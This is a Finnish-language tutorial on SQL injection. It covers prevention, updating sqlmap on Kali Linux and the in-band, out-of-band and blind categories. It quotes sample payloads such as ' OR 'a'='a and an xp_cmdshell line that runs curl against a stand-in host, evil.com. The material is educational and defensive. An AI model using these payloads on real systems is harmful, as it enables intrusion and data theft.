# SQL injektio

SQL-injektio (SQL injection) on tietoturvahyökkäys, jossa hyökkääjä voi manipuloida verkkosovelluksen tai tietokannan SQL-kyselyitä. Tämä tapahtuu syöttämällä haitallista SQL-koodia sovellukseen, joka ei ole suojattu asianmukaisesti. SQL-injektio voi mahdollistaa hyökkääjän suorittaa tietokannan komentoja, kuten lukemaan, muokkaamaan tai poistamaan tietoja, jopa hankkimaan järjestelmänvalvojan oikeudet.

SQL-injektiohyökkäyksen perusidea on hyödyntää puutteellisesti suodatettuja syötteitä (kuten käyttäjän syöttämiä lomaketietoja tai URL-parametreja) ja liittää niihin haitallista SQL-koodia. Jos sovellus ei tarkista tai puhdista syötteitä kunnolla, hyökkääjä voi lisätä oman SQL-lausekkeen alkuperäiseen kyselyyn, joka suoritetaan tietokannassa.


Oletetaan, että sinulla on verkkosivusto/palvelin/tietokanta, jossa käyttäjä voi kirjautua sisään syöttämällä käyttäjätunnuksen ja salasanan. Jos kirjautumislomakkeen tiedot liitetään suoraan SQL-kyselyyn ilman oikeaa suodatusta, hyökkääjä voi syöttää seuraavanlaisen syötteen: `root` ja ei ole salasanaa, tai oletuksena käyttäjätunnus ja salasana OVAT `root` tai joko `admin`.


## ehkäiseminen ja turvallisuuden kannalta

SQL-injektion välttäminen on olennainen osa verkkosovellusten ja tietokantojen suojaamista. 


- Tietokannan suojaus: Tietokannassa, kuten MariaDB/MySQL:ssä, tulisi käyttää vahvoja ja pitkiä salasanoja, jotka estävät hakkereita pääsemästä käsiksi järjestelmään. Vahva salasana sisältää suuria ja pieniä kirjaimia, numeroita ja erikoismerkkejä.
  
- Ylläpitäjien hallinta: Mikäli tietokannassa on useita ylläpitäjiä, on suositeltavaa luoda vähintään kaksi tai useampi ylläpitäjän tili, jotka jakavat vastuuta ja rajoittavat yksittäisen käyttäjän pääsyä. Näin varmistetaan, että kaikki oikeudet eivät ole yhden henkilön käsissä.

- Syötteiden validointi: Käyttäjän syötteitä ei koskaan tulisi liittää suoraan SQL-kyselyihin, sillä se voi mahdollistaa SQL-injektion. Sen sijaan tulisi käyttää valmisteltuja kyselyitä (prepared statements), joissa käyttäjän syöte käsitellään turvallisesti erillään SQL-komennosta.

- Päivitykset ja haavoittuvuuksien hallinta: Sovellukset ja käytettävät ohjelmistot, kuten tietokannan hallintajärjestelmät (esim. MySQL, PostgreSQL), tulisi päivittää säännöllisesti, jotta tunnetut haavoittuvuudet saadaan korjattua. Tällöin voidaan estää hyökkäyksiä, jotka voisivat käyttää hyväkseen ohjelmistojen vanhentuneita versioita.

<hr>

## kali linux ja sqlmap

Sekä pieni huomiona, tätä sqlmap - komentoa jos toistaa useammin niin jossakin tilanteessa tulee pieni katkosta eli vähä kuin aikaleima. Jossain tilantteessa tällainen saattaa tulla, jossa tämä tarkoittaa sqlmap-työkalu versio on vanhentunut. Voi vaikuttaa, että sqlmap ei toimi oikein, ja ei ehkä pysty käyttämään uusia ominaisuuksia tai korjauksia, joita on lisätty työkaluun alunperin verrattuna uudenmpiin versioihin. 

```
[*] starting @ 18:39:30 /2024-12-08/

[18:39:30] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:39:55] [CRITICAL] host 'testasp.vulnweb.com' does not exist
[18:39:55] [WARNING] your sqlmap version is outdated

[*] ending @ 18:39:55 /2024-12-08/
```

Vanha sqlmap-versio ei välttämättä tue uusimpia tekniikoita, joita tarvitaan nykyään verkkosivustojen SQL-injektiohaavoittuvuuksien löytämiseen, etenkin jos verkkosivustolla on lisäsuojauksia. Tämä voi estää sinua suorittamasta SQL-injektiohyökkäystä onnistuneesti. Lisäksi, jos tietokannan rakenteessa on muutoksia tai uusia tietoturvatoimenpiteitä, vanha versio saattaa olla kykenemätön käsittelemään niitä.

Päivittäminen menee komennolla `sqlmap --update` ja jos ei tiedä mitä komentoa ja miten päivittää tarkista apua ensin `sqlmap -h` ja tämä on kali linux alla tmä työkalu, niin on hyvä tarvittaessa päivittää oman kali linux ohjelman `sudo apt update` tämä päivittää versiot, mutta jos päivittää `sudo apt upgrade` niin se syö muisti ja vie resurssien muistia. 

<hr>

# SQL Injection kategoriat:

Kolmen typpistä injektio ovat; 

- In-band SQL injection; Hyökkääjä suorittaa SQL-kyselyt samalla yhteyden kautta ja saa vastauksia heti. Toisin sanoen, kaikki tiedot saadaan samassa "kanavassa" hyökkäyksen aikana. Tässä kategorian sisällä voidaan puhua esimerkiksi error-based SQL injection (virheilmoitusten kautta) tai union-based SQL injection (tietojen yhdistämisen kautta). Hyökkääjä saa välittömästi palautetta kyselyjen tuloksista ja voi käyttää tätä tietoa hyväkseen. Esim. `' OR 'a'='a`
  (lyhyesti sanottuna;  Hyökkääjä saa suoraa palautetta samassa yhteydessä kyselyistä.)

- Out-of-band SQL injection; hyökkääjä ei saa palautetta samassa yhteydessä kuin kyselyä suoritetaan. Sen sijaan tietoja voidaan siirtää jollain muulla tavalla, esimerkiksi erillisten kanavien (kuten verkkopyynnöt) kautta. Tämä voi tapahtua esimerkiksi, jos SQL-kysely suorittaa toimenpiteitä, jotka laukaisevat ulkoisen tiedonsiirron (esim. tietojen lähettäminen hyökkääjän palvelimelle). Out-of-band-injektiot eivät ole yhtä yleisiä, koska ne edellyttävät, että tietokannan on tuettava ulkoisten yhteyksien tekemistä, mutta ne voivat olla tehokkaita. Esim. `'; EXEC xp_cmdshell('curl http://evil.com/attack') --
   (lyhyesti sanottuna;  Hyökkääjä saa tietoa muilla kanavilla, kuten verkkopyynnöillä.)

- blind / inferential SQL injection; Blind SQL-injektiossa ei saada suoraa palautetta SQL-kyselyistä, mutta hyökkääjä voi päätellä tietoja epäsuorasti, esimerkiksi kokeilemalla erilaisia ehtoja ja katsomalla, miten sivusto reagoi. Tässä ei ole virheilmoituksia eikä suoraa tietoa, mutta silti hyökkääjä voi arvaamalla selvittää tietokannan rakennetta ja tietoja. Blind SQL Injection voidaan jakaa edelleen kahteen tyyppiin:
  
 -  boolean-based Blind SQL injection: Hyökkääjä yrittää muuttaa SQL-kyselyä siten, että kyselyn tulos on joko "totta" tai "epätotta", ja seuraamalla käyttäjän reaktiota (esim. sivun lataus tai virhe) voi päätellä, onko tietty ehto täsmällinen.
 -  Time-based Blind SQL Injection: Tässä hyökkääjä pakottaa tietokannan odottamaan tietyn ajan ennen vastauksen lähettämistä, ja aikaa mittaamalla voidaan päätellä, onko ehto ollut totta vai epätotta.

Esim. `' AND 1=1 --` - sivu latautuu normaalisti tarkoittaa ehto 1=1. Mutta jos esim. `' AND 1=2 --` ettei sivu lataudu. Näin hän voi päätellä, että ehto 1=2 on epätosi.

   (lyhyesti sanottuna; Hyökkääjä ei saa suoraa palautetta, vaan päättelee tietoja epäsuorasti käyttäen sivuston käyttäytymistä (boolean- tai time-based).)

